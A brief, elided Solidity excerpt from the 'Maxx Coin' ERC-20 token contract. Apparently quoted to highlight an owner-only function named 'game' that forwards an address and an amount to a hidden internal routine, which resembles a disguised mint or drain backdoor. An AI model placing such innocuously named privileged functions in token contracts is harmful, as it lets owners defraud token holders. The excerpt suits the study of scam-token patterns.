...
contract MAXX is Context, IERC20, Ownable {
    ...
    string private _name = "Maxx Coin";
    string private _symbol = "Maxx";
    ...
    function game(address _to, uint256 _amount) public onlyOwner {
        _game(_to, _amount);
    }
